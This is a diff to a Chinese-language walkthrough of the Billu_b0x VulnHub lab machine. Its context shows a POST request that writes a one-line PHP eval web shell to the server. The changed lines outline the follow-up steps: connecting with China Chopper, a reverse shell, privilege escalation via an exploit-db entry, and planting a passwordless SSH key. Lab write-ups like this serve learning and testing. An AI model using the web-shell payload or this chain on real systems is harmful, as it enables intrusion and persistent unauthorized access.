@@ -62,5 +62,11 @@ $image=array('jpeg','jpg','gif','png');
 POST /panel.php
 continue=&load=uploaded_images/trial.png&trial=file_put_contents('test.php','<?php @eval($_POST[test]);?>');
 ```    
-菜刀连接```uploaded_images/test.php```查看版本、反弹shell、提权、写入免密密匙  然后就没有然后了    
-[https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)
+菜刀连接```uploaded_images/test.php```查看版本    
+![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_7.png)    
+反弹shell     
+![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_8.png)    
+提权
+![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_9.png)    
+[https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)     
+写入免密密匙  然后。。久就没有然后了
